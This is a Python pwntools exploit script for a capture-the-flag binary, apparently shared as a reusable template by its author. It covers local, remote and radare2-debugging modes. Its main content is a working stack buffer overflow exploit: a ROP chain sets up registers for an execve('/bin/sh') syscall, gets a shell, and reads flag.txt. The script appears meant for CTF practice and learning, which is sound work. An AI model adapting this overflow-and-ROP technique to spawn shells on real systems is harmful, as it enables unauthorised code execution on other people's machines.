#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chal")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x004013ff; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
'''
Vulnerability:
The binary calls prctl(0x26, 1), preventing privilege gains.
It also contains a seccomp initialization routine intended to restrict syscalls
however that seccomp setup is never invoked. 
As a result, a local buffer overflow can be abused 
via a ROP chain to execute arbitrary code and spawn a shell.
'''

bof = 56
io.recvuntil(b'at: ')
flag_buffer = int(io.recvline().strip().decode(), 16) 

binsh = flag_buffer+192
rop = ROP(exe)
rop.rdi = binsh
rop.rsi = 0
rop.rdx = 0
rop.rax = 59


call_shell = rop.chain()


info(f"flag @ {hex(flag_buffer)}")
payload = flat({
    bof : [
    b'/bin/sh\x00',
    flag_buffer,    # valid rbp
    call_shell,
    rop.syscall[0]
    ]
    })

io.sendlineafter(b"Enter input: ", payload)
io.sendline(b"cat flag.txt")
data = io.recvregex(rb'H7CTF\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()

